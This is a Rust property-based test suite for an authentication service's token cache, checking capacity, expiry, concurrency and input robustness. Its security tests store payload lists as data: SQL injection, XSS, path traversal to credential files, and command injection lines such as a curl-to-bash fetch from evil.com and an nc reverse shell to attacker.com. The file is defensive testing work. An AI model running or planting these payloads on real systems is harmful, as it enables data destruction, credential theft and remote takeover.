#![cfg(feature = "property-tests")]
//! Enhanced Property-Based Testing Suite
//!
//! Comprehensive property-based tests for critical security components,
//! ensuring robust behavior across edge cases and input variations.

use proptest::prelude::*;
use proptest::strategy::Strategy;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// Import our storage modules for testing
use auth_service::storage::cache::{LruTokenCache, TokenCacheConfig};

// Import common types
use common::TokenRecord;

/// Strategy for generating valid token records
pub fn token_record_strategy() -> impl Strategy<Value = TokenRecord> {
    (
        any::<bool>(),                              // active
        proptest::option::of("[a-zA-Z0-9_]{1,50}"), // scope
        proptest::option::of("[a-zA-Z0-9_]{1,50}"), // client_id
        proptest::option::of(any::<i64>()),         // exp
        proptest::option::of(any::<i64>()),         // iat
        proptest::option::of("[a-zA-Z0-9_]{1,50}"), // sub
        proptest::option::of(any::<String>()),      // token_binding
        any::<bool>(),                              // mfa_verified
    )
        .prop_map(
            |(active, scope, client_id, exp, iat, sub, token_binding, mfa_verified)| TokenRecord {
                active,
                scope,
                client_id,
                exp,
                iat,
                sub,
                token_binding,
                mfa_verified,
            },
        )
}

/// Strategy for generating valid cache configurations
pub fn cache_config_strategy() -> impl Strategy<Value = TokenCacheConfig> {
    (1..100_000usize, 1..86_400u64, 1..3_600u64).prop_map(
        |(max_tokens, max_age_secs, cleanup_interval_secs)| TokenCacheConfig {
            max_tokens,
            max_age: Duration::from_secs(max_age_secs),
            cleanup_interval: Duration::from_secs(cleanup_interval_secs),
        },
    )
}

#[test]
fn test_token_cache_capacity_limits() {
    let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
        cases: 1000,
        max_shrink_iters: 1000,
        timeout: 30000,
        ..ProptestConfig::default()
    });

    let strategy = (
        prop::collection::vec(token_record_strategy(), 1..1000usize),
        cache_config_strategy(),
    );

    runner
        .run(&strategy, |(tokens, config)| {
            let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
            rt.block_on(async move {
                let cache = LruTokenCache::with_config(config.clone());
                for (i, token) in tokens.into_iter().enumerate() {
                    let key = format!("token_{i}");
                    cache.insert(key.clone(), token).await;
                    let stats = cache.stats().await;
                    prop_assert!(
                        stats.entries <= config.max_tokens,
                        "Cache exceeded capacity"
                    );
                }
                Ok(())
            })
        })
        .expect("Token cache capacity test failed");
}

#[test]
fn test_token_cache_expiration() {
    let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
        cases: 100,
        max_shrink_iters: 100,
        timeout: 30000,
        ..ProptestConfig::default()
    });

    let strategy = (
        prop::collection::vec(token_record_strategy(), 1..100usize),
        cache_config_strategy(),
    );

    runner
        .run(&strategy, |(tokens, config)| {
            let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
            rt.block_on(async move {
                let cache = LruTokenCache::with_config(config);

                for (i, mut token) in tokens.into_iter().enumerate() {
                    let key = format!("token_{i}");
                    if i % 3 == 0 {
                        token.exp = Some(
                            i64::try_from(
                                SystemTime::now()
                                    .duration_since(UNIX_EPOCH)
                                    .expect("System time should be after UNIX epoch")
                                    .as_secs()
                                    .saturating_sub(3600),
                            )
                            .unwrap_or(0),
                        );
                    }
                    cache.insert(key, token).await;
                }

                cache.cleanup_expired().await;
                let _ = cache.stats().await;
                Ok(())
            })
        })
        .expect("Token cache expiration test failed");
}

#[test]
fn test_cache_access_patterns() {
    let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
        cases: 300,
        max_shrink_iters: 300,
        timeout: 30000,
        ..ProptestConfig::default()
    });

    let strategy = (
        prop::collection::vec(token_record_strategy(), 10..100usize),
        prop::collection::vec(0..100usize, 100..1000usize),
        cache_config_strategy(),
    );

    runner
        .run(&strategy, |(tokens, access_pattern, config)| {
            let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
            rt.block_on(async move {
                let cache = LruTokenCache::with_config(config);
                let mut keys = Vec::new();
                for (i, token) in tokens.into_iter().enumerate() {
                    let key = format!("token_{i}");
                    keys.push(key.clone());
                    cache.insert(key, token).await;
                }
                for &index in &access_pattern {
                    if !keys.is_empty() {
                        let key_index = index % keys.len();
                        cache.get(&keys[key_index]).await;
                    }
                }
                let stats = cache.stats().await;
                prop_assert!(stats.hits + stats.misses > 0, "No cache accesses recorded");
                prop_assert!(
                    stats.hit_rate >= 0.0 && stats.hit_rate <= 1.0,
                    "Invalid hit rate"
                );
                Ok(())
            })
        })
        .expect("Cache access patterns test failed");
}

#[test]
fn test_cache_concurrent_access() {
    let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
        cases: 100,
        max_shrink_iters: 100,
        timeout: 30000,
        ..ProptestConfig::default()
    });

    let strategy = (
        prop::collection::vec(token_record_strategy(), 10..50usize),
        cache_config_strategy(),
    );

    runner
        .run(&strategy, |(tokens, config)| {
            let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
            rt.block_on(async move {
                let cache = LruTokenCache::with_config(config);
                for (i, token) in tokens.into_iter().enumerate() {
                    let key = format!("token_{i}");
                    cache.insert(key, token).await;
                }
                let handles: Vec<_> = (0..10)
                    .map(|_| {
                        let cache_clone = cache.clone();
                        tokio::spawn(async move {
                            for i in 0..100 {
                                let i_mod = i % 10;
                                let key = format!("token_{i_mod}");
                                cache_clone.get(&key).await;
                                let token = TokenRecord {
                                    active: true,
                                    scope: Some("test".to_string()),
                                    client_id: Some("test".to_string()),
                                    exp: None,
                                    iat: None,
                                    sub: Some("test".to_string()),
                                    token_binding: None,
                                    mfa_verified: false,
                                };
                                let new_key = format!("new_token_{i}");
                                cache_clone.insert(new_key, token).await;
                            }
                        })
                    })
                    .collect();
                for handle in handles {
                    let result = handle.await;
                    prop_assert!(result.is_ok(), "Concurrent access failed");
                }
                let _stats = cache.stats().await;
                Ok(())
            })
        })
        .expect("Cache concurrent access test failed");
}

/// Integration test for session store with property-based testing
#[cfg(test)]
mod session_store_tests {
    use super::*;

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: 100,
            max_shrink_iters: 100,
            timeout: 10000,
            .. ProptestConfig::default()
        })]

        /// Test session store basic operations
        #[test]
        fn test_session_store_basic_operations(
            session_ids in prop::collection::vec("[a-zA-Z0-9]{10,50}", 1..50),
            data in prop::collection::vec(prop::collection::hash_map("[a-zA-Z0-9]{1,20}", "[a-zA-Z0-9]{1,100}", 1..10), 1..50),
        ) {
            // This would test Redis session store if Redis is available
            // For now, we just verify the test setup doesn't crash
            prop_assert!(!session_ids.is_empty(), "No session IDs provided");
            prop_assert!(!data.is_empty(), "No session data provided");
            prop_assert!(session_ids.len() == data.len(), "Mismatched session data");
        }
    }
}

/// Security-specific property tests
#[cfg(test)]
mod security_property_tests {
    use super::*;
    // use proptest_regex::RegexGenerator; // Not required

    /// Test for SQL injection patterns in input data
    #[test]
    fn test_sql_injection_resistance() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 1000,
            max_shrink_iters: 1000,
            timeout: 10000,
            ..ProptestConfig::default()
        });

        let sql_injection_patterns = vec![
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin' --",
            "' OR 'x'='x",
            "1; SELECT * FROM information_schema.tables;",
            "'; EXEC xp_cmdshell('dir'); --",
            "UNION SELECT password FROM users WHERE '1'='1",
            "1' AND 1=1 UNION SELECT username, password FROM users --",
        ];

        let strategy = proptest::sample::select(sql_injection_patterns);

        runner
            .run(&strategy, |sql_payload| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    // Create a token record with potentially malicious data
                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(sql_payload.to_string()),
                        client_id: Some(sql_payload.to_string()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(sql_payload.to_string()),
                        token_binding: Some(sql_payload.to_string()),
                        mfa_verified: false,
                    };

                    // The cache should handle this without crashing or SQL injection
                    cache.insert(sql_payload.to_string(), malicious_token).await;

                    // Verify we can retrieve it
                    let retrieved = cache.get(sql_payload).await;
                    prop_assert!(
                        retrieved.is_some(),
                        "Cache should handle malicious input gracefully"
                    );

                    Ok(())
                })
            })
            .expect("SQL injection resistance test failed");
    }

    /// Test for XSS patterns in input data
    #[test]
    fn test_xss_pattern_resistance() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 500,
            max_shrink_iters: 500,
            timeout: 8000,
            ..ProptestConfig::default()
        });

        let xss_patterns = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<a href='javascript:alert(\"XSS\")'>Click me</a>",
            "<div style='background-image: url(javascript:alert(\"XSS\"))'>",
            "<meta http-equiv='refresh' content='0; url=javascript:alert(\"XSS\")'>",
            "<object data='javascript:alert(\"XSS\")'>",
            "<embed src='javascript:alert(\"XSS\")'>",
        ];

        let strategy = proptest::sample::select(xss_patterns);

        runner
            .run(&strategy, |xss_payload| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(xss_payload.to_string()),
                        client_id: Some(xss_payload.to_string()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(xss_payload.to_string()),
                        token_binding: Some(xss_payload.to_string()),
                        mfa_verified: false,
                    };

                    cache
                        .insert(format!("safe_key_{}", xss_payload.len()), malicious_token)
                        .await;
                    Ok(())
                })
            })
            .expect("XSS pattern resistance test failed");
    }

    /// Test for path traversal patterns
    #[test]
    fn test_path_traversal_resistance() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 300,
            max_shrink_iters: 300,
            timeout: 6000,
            ..ProptestConfig::default()
        });

        let path_traversal_patterns = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/absolute/path/../../../root",
            "valid/path/../../../secret",
            "..\\..\\..\\secret.txt",
            ".../...//secret",
            "\u{2e}\u{2e}\u{2f}\u{2e}\u{2e}\u{2f}\u{2e}\u{2e}\u{2f}etc\u{2f}passwd", // Unicode
        ];

        let strategy = proptest::sample::select(path_traversal_patterns);

        runner
            .run(&strategy, |path_payload| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(path_payload.to_string()),
                        client_id: Some(path_payload.to_string()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(path_payload.to_string()),
                        token_binding: Some(path_payload.to_string()),
                        mfa_verified: false,
                    };

                    // Use a safe key, but store malicious data
                    cache
                        .insert(format!("safe_key_{}", path_payload.len()), malicious_token)
                        .await;
                    Ok(())
                })
            })
            .expect("Path traversal resistance test failed");
    }

    /// Test for command injection patterns
    #[test]
    fn test_command_injection_resistance() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 200,
            max_shrink_iters: 200,
            timeout: 5000,
            ..ProptestConfig::default()
        });

        let command_injection_patterns = vec![
            "; rm -rf /",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(rm -rf /)",
            "; ls -la",
            "| id",
            "`whoami`",
            "$(uname -a)",
            "; curl http://evil.com/malware.sh | bash",
            "| nc -e /bin/sh attacker.com 4444",
        ];

        let strategy = proptest::sample::select(command_injection_patterns);

        runner
            .run(&strategy, |cmd_payload| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(cmd_payload.to_string()),
                        client_id: Some(cmd_payload.to_string()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(cmd_payload.to_string()),
                        token_binding: Some(cmd_payload.to_string()),
                        mfa_verified: false,
                    };

                    cache
                        .insert(format!("safe_key_{}", cmd_payload.len()), malicious_token)
                        .await;
                    Ok(())
                })
            })
            .expect("Command injection resistance test failed");
    }

    /// Test for extremely long inputs that could cause `DoS`
    #[test]
    fn test_extremely_long_input_handling() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 10,
            max_shrink_iters: 10,
            timeout: 15000,
            ..ProptestConfig::default()
        });

        // Generate extremely long strings
        let strategy = prop::collection::vec(prop::char::any(), 10000..100_000);

        runner
            .run(&strategy, |long_input_vec| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let long_string: String = long_input_vec.into_iter().collect();
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(long_string.clone()),
                        client_id: Some(long_string.clone()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(long_string.clone()),
                        token_binding: Some(long_string.clone()),
                        mfa_verified: false,
                    };

                    // Test with truncated key to avoid key length issues
                    let key = format!("key_{}", long_string.len() % 1000);
                    cache.insert(key, malicious_token).await;
                    Ok(())
                })
            })
            .expect("Extremely long input handling test failed");
    }

    /// Test for null bytes and control characters
    #[test]
    fn test_null_byte_and_control_char_handling() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 100,
            max_shrink_iters: 100,
            timeout: 3000,
            ..ProptestConfig::default()
        });

        let malicious_chars = vec![
            '\0',       // null byte
            '\x01',     // SOH
            '\x02',     // STX
            '\x03',     // ETX
            '\x04',     // EOT
            '\x1F',     // US (unit separator)
            '\x7F',     // DEL
            '\u{80}',   // high ASCII
            '\u{202E}', // RTL override
            '\u{200E}', // LTR mark
        ];

        let strategy = proptest::sample::select(malicious_chars);

        runner
            .run(&strategy, |malicious_char| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);

                    let malicious_string = format!("malicious{malicious_char}data");
                    let malicious_token = TokenRecord {
                        active: true,
                        scope: Some(malicious_string.clone()),
                        client_id: Some(malicious_string.clone()),
                        exp: Some(1_234_567_890),
                        iat: Some(1_234_567_800),
                        sub: Some(malicious_string.clone()),
                        token_binding: Some(malicious_string.clone()),
                        mfa_verified: false,
                    };

                    cache
                        .insert(
                            format!("safe_key_{}", malicious_char as u32),
                            malicious_token,
                        )
                        .await;
                    Ok(())
                })
            })
            .expect("Null byte and control character handling test failed");
    }

    #[test]
    fn test_cache_resilience_to_malformed_data() {
        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
            cases: 500,
            max_shrink_iters: 500,
            timeout: 15000,
            ..ProptestConfig::default()
        });

        let strategy = (
            prop::collection::vec(".*", 1..100usize),
            prop::collection::vec(
                prop::collection::hash_map(".*", ".*", 0..20usize),
                1..100usize,
            ),
        );

        runner
            .run(&strategy, |(malformed_keys, malformed_data)| {
                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
                rt.block_on(async move {
                    let config = TokenCacheConfig::default();
                    let cache = LruTokenCache::with_config(config);
                    for (i, key) in malformed_keys.into_iter().enumerate() {
                        if i < malformed_data.len() {
                            let token = TokenRecord {
                                active: true,
                                scope: malformed_data[i].get("scope").cloned(),
                                client_id: malformed_data[i].get("client_id").cloned(),
                                exp: malformed_data[i].get("exp").and_then(|s| s.parse().ok()),
                                iat: malformed_data[i].get("iat").and_then(|s| s.parse().ok()),
                                sub: malformed_data[i].get("sub").cloned(),
                                token_binding: malformed_data[i].get("token_binding").cloned(),
                                mfa_verified: false,
                            };
                            cache.insert(key, token).await;
                        }
                    }
                    Ok(())
                })
            })
            .expect("Cache resilience to malformed data test failed");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::test_runner::TestRunner;

    #[test]
    fn test_token_record_strategy() {
        let strategy = token_record_strategy();
        let mut runner = TestRunner::default();

        // Generate a few examples to ensure the strategy works
        for _ in 0..10 {
            let result = runner.run(&strategy, |token| {
                // Just verify the token has reasonable structure
                prop_assert!(
                    token.sub.is_some() || token.client_id.is_some(),
                    "Token should have at least a subject or client ID"
                );
                Ok(())
            });

            if let Err(e) = result {
                panic!("Strategy test failed: {e:?}");
            }
        }
    }

    #[test]
    fn test_cache_config_strategy() {
        let strategy = cache_config_strategy();
        let mut runner = TestRunner::default();

        for _ in 0..10 {
            let result = runner.run(&strategy, |config| {
                prop_assert!(config.max_tokens > 0, "Max tokens should be positive");
                prop_assert!(config.max_age.as_secs() > 0, "Max age should be positive");
                prop_assert!(
                    config.cleanup_interval.as_secs() > 0,
                    "Cleanup interval should be positive"
                );
                Ok(())
            });

            if let Err(e) = result {
                panic!("Strategy test failed: {e:?}");
            }
        }
    }
}
